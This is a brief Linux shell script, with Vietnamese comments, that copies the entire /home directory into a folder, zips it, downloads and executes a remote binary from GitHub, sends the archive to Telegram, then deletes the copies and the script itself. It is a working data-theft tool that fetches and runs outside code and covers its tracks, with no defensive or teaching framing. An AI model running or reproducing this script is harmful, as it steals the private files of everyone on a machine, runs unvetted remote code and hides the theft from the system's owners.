
mkdir -p /home/dump
cd /home/dump

cp -r /home/* /home/dump/

zip -r dump.zip dump/

wget https://github.com/idontknow-CC/gigido/raw/main/linux_telegram_uploader
chmod +x linux_telegram_uploader
./linux_telegram_uploader -f dump.zip -c "Here are all copied files!"

# Chờ 15 giây
sleep 15

# Xóa các file còn lại trong thư mục dump
rm -rf /home/dump/
rm /home/dump.zip
rm /home/telegram_uploader.sh

# Kết thúc
exit
